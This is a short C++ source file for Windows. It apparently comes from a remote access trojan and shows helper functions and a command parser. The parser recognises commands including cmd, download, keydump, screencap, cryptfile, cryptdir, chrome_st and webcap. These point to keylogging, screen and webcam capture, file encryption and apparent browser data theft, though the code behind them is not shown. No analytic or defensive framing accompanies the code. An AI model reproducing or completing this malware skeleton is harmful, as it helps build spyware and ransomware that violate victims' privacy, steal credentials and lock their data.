
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

void throw_error(const char* error_text) {

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 12);
	std::cout << "error: ";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << error_text << std::endl;
	exit(1);
}

bool dirExists(const std::string& dirName_in) {

	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;
	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;
	return false;

}

int parse(std::string comm) {
	if (comm == "help")			  return 1;
	else if (comm == "close")     return 2;
	else if (comm == "pwd")       return 3;
	else if (comm == "cmd")		  return 4;
	else if (comm == "ls")        return 5;
	else if (comm == "rm")        return 6;
	else if (comm == "rmdir")     return 7;
	else if (comm == "info")      return 8;
	else if (comm == "ps")        return 9;
	else if (comm == "kill")      return 10;
	else if (comm == "keydump")   return 11;
	else if (comm == "download")  return 12;
	else if (comm == "error")     return 13;
	else if (comm == "screencap") return 14;
	else if (comm == "cryptfile") return 15;
	else if (comm == "cryptdir") return 16;
	else if (comm == "chrome_st") return 17;
	else if (comm == "webcap") return 18;
	else return 0;
}
